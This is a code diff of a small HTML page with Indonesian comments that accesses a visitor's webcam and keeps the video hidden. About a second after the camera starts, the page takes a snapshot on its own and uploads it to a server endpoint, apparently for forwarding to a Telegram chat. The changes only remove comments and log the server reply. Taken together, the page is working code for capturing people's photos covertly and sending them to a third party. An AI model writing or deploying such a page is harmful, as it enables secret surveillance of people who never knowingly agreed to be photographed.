@@ -5,7 +5,7 @@
   <title>Foto Otomatis ke Telegram</title>
   <style>
     body { font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding:24px; }
-    video { display:none; } /* video disembunyikan karena otomatis */
+    video { display:none; }
   </style>
 </head>
 <body>
@@ -20,9 +20,9 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // begitu kamera aktif, langsung ambil & kirim foto
+        // auto capture begitu kamera siap
         video.onloadedmetadata = () => {
-          setTimeout(captureAndSend, 1000); // tunggu 1 detik agar video siap
+          setTimeout(captureAndSend, 1000);
         };
       } catch (err) {
         console.error('Gagal akses kamera:', err);
@@ -40,12 +40,12 @@
       const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
       try {
-        await fetch('/api/upload', {
+        const res = await fetch('/api/upload', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ image: dataUrl })
         });
-        console.log('Foto berhasil dikirim ke Telegram');
+        console.log(await res.text());
       } catch (err) {
         console.error('Gagal kirim:', err);
       }
